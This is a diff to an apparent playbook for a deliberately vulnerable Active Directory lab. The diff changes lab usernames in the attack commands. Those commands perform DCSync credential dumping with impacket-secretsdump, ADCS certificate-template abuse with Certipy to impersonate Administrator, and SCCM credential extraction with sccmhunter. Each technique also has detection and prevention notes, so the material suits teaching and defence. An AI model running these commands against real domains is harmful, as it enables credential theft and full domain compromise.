@@ -19,7 +19,7 @@ See PER-019.
 **Tools:** `impacket-secretsdump -just-dc`.
 **Steps:**
 ```bash
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc
 ```
 **Detection:** Defender for Identity native; non-DC IP issuing DRSR.
 **Prevention:** audit DCSync rights; remove non-DC principals with `Replicating Directory Changes (All)`.
@@ -95,8 +95,8 @@ See LAT-034.
 **Tools:** `Certipy`.
 **Steps:**
 ```bash
-certipy find -u alice -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
-certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template ESC1Template \
+certipy find -u peter.parker -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
+certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template ESC1Template \
    -upn Administrator@corp.local -target ca01.corp.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 # now NT hash for Administrator
@@ -124,7 +124,7 @@ See CRED-047.
 **Tools:** `Certipy template -save-old`.
 **Steps:**
 ```bash
-certipy template -u alice -p 'DVADlab2024!' -template ESC4Template -save-old
+certipy template -u peter.parker -p 'DVADlab2024!' -template ESC4Template -save-old
 # then exploit as ESC1
 ```
 **Detection:** Event `5136` on template object; MDI ESC4.
@@ -150,9 +150,9 @@ See CRED-027.
 **Tools:** `Certipy ca -issue-request`.
 **Steps:**
 ```bash
-certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template User -upn Administrator@corp.local
+certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template User -upn Administrator@corp.local
 # request goes to pending; with officer rights:
-certipy ca -u alice -p 'DVADlab2024!' -ca corp-CA-CA -issue-request <ID>
+certipy ca -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -issue-request <ID>
 certipy req -retrieve <ID>
 ```
 **Detection:** ADCS audit logs; officer approval of unusual requests.
@@ -238,8 +238,8 @@ See PER-031.
 **Tools:** `Certipy req -template ESC13Template`.
 **Steps:**
 ```bash
-certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template ESC13Template
-certipy auth -pfx alice.pfx
+certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template ESC13Template
+certipy auth -pfx peter.parker.pfx
 # resulting TGT carries the linked group SID in PAC
 ```
 **Detection:** ADCS audit + MDI ESC13.
@@ -304,8 +304,8 @@ See LAT-034.
 **Tools:** `sccmhunter`, `SharpSCCM`, `ntlmrelayx -t mssql://`.
 **Steps:**
 ```bash
-sccmhunter find -u alice -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
-sccmhunter naa -u alice -p 'DVADlab2024!' -t sccm.corp.local
+sccmhunter find -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
+sccmhunter naa -u peter.parker -p 'DVADlab2024!' -t sccm.corp.local
 ```
 **Detection:** SCCM audit logs; abnormal MSSQL `EXECUTE AS`; MDI.
 **Prevention:** disable NAA; enhanced HTTP/PKI mode; tier SCCM admins.
